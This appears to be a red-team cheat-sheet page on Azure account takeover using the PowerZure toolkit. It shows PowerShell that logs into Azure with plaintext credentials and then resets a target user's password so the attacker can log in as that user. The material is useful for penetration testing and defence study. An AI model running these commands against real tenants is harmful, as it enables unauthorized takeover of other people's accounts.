# AZResetPassword

{% embed url="https://github.com/hausec/PowerZure" %}

Connecting to Azure from an admin PowerShell console

```ps1
$username = "<USER>"
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential $username, $password
Connect-AzAccount -Credential $Creds
```

Reset the password for the target, then follow the steps above to login as the new user

```shellscript
Import-Module .\PowerZure.psd1
Set-AzureADUserPassword -Username <TARGET> -Password <NEW_PASSWORD>
```
